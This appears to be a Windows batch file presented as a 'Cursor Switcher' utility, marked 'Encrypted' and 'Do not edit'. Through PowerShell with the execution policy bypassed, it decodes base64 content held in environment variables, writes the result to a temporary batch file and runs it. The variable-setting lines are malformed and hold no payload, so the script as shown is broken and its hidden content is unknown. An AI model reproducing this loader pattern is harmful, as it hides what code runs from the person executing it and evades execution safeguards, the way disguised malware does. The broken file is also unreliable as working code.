@echo off
title Cursor Switcher
color 0A
mode con: cols=74 lines=48 >nul 2>&1
setlocal EnableDelayedExpansion
REM Encrypted Cursor Switcher - Do not edit
set "B64_"
set "B64_"
set "B64_"
set "B64_"
set "B64_"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $e=[Text.Encoding]::UTF8; $d=[Convert]::FromBase64String($env:B64_0+$env:B64_1+$env:B64_2+$env:B64_3+$env:B64_4); $c=$e.GetString($d); $p=$env:TEMP+'\cs_run.bat'; [IO.File]::WriteAllText($p,$c,(New-Object Text.UTF8Encoding $false)); & cmd /c $p; exit $LASTEXITCODE } catch { Write-Host ('ERR: '+$_.Exception.Message); pause }"
exit /b %errorlevel%
